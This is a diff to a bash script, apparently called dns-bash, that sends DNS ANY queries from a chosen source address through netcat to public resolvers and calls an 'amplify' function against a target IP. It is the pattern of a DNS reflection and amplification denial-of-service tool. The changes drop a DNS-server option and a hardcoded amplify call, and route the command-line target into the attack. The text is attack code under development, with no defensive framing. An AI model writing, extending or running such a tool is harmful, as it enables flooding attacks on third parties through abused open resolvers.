@@ -16,7 +16,6 @@ function banner {
     echo  ""
     echo -e "\e[38;5;39mOptions:"
     echo -e "\e[38;5;39m  -t <query_type>  Query type (default: ANY)"
-    echo -e "\e[38;5;39m  -s <dns_server>  DNS server (default: 8.8.8.8)"
     echo -e "\e[38;5;39m  -p <port>        DNS server port (default: 53)"
     echo ""
     echo -e "\e[38;5;39mExample: dns-bash 192.168.1.100 -t ANY -s 1.1.1.1 -p 53"
@@ -40,7 +39,7 @@ function send_dns_query {
     fi
 
     if ! echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" 2>&1 >/dev/null; then
-        echo "Failed to send DNS query: $(echo -n "$packet" | nc -u -w1 -s "$src_ip" "$resolver" "$port" 2>&1)"
+        echo "Failed to send DNS query"
         return 1
     fi
 }
@@ -85,7 +84,6 @@ function main {
     shift
 
     QUERY_TYPE="ANY"
-    DNS_SERVER=""
     PORT="53"
 
     while [[ $# -gt 0 ]]; do
@@ -93,11 +91,6 @@ function main {
         case $key in
             -t|--query-type)
             QUERY_TYPE="$2"
-            shift
-            shift
-            ;;
-            -s|--dns-server)
-            DNS_SERVER="$2"
             shift
             shift
             ;;
@@ -114,7 +107,7 @@ function main {
     done
 
     get_public_dns_servers
+    amplify $TARGET_IP $PORT $QUERY_TYPE
 }
 
-get_public_dns_servers
-amplify 232.123.45.3 53 ANY 8.8.8.8
+main "$@"
